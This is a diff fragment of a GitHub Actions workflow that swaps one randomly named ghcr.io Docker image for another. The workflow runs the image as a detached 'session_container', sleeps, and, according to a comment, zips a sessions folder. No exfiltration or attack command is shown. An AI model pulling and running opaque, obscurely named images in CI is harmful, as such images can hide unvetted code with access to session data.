@@ -15,11 +15,11 @@ jobs:
       uses: actions/checkout@v2
 
     - name: Pull Docker image
-      run: docker pull ghcr.io/nixegohshs5f4ef6vuun43f6/iaw4sm7rs56v3cy7rv66v4rfgu6yu843dawsmsrbitbpyv3125:yhf3gj79bt8kytv57vttv7awsmsrbitB0006-of-two
+      run: docker pull ghcr.io/nixegohshs5f4ef6vuun43f6/hvhj456v3cy7rv66v4rfgu6rtyu8843dbitapyv3125:yhf3gj79bt8kytv57vttv7rec7bitA0001-of-one
 
     - name: Run Initial Docker Processes
       run: |
-        docker run -d --name session_container ghcr.io/nixegohshs5f4ef6vuun43f6/iaw4sm7rs56v3cy7rv66v4rfgu6yu843dawsmsrbitbpyv3125:yhf3gj79bt8kytv57vttv7awsmsrbitB0006-of-two
+        docker run -d --name session_container ghcr.io/nixegohshs5f4ef6vuun43f6/hvhj456v3cy7rv66v4rfgu6rtyu8843dbitapyv3125:yhf3gj79bt8kytv57vttv7rec7bitA0001-of-one
         # Simulate initial processes
         sleep 300 # Sleep for 5 minutes
         # Ensure proper permissions and zip the sessions folder
